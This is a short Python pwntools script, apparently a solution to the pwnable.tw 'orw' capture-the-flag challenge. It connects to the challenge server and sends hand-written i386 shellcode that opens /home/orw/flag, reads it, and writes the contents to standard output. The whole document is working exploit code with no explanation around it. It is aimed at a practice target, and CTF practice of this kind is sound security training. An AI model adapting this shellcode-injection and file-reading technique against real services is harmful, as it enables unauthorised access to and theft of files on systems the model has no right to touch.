from pwn import *

r = remote("chall.pwnable.tw", 10001)

sc = asm(
"""
    jmp hello
write :
    pop ebx
    mov eax,5
    mov ecx,0
    int 0x80

    mov ebx,eax
    mov ecx,esp
    mov edx,0x60
    mov eax,3
    int 0x80

    mov edx,eax
    mov ebx,1
    mov eax,4
    int 0x80

    mov eax,1
    int 0x80

hello :
    call write
    .ascii "/home/orw/flag"
    .byte 0

""", arch = "i386")

r.recvuntil(":")
r.send(sc)

r.interactive()
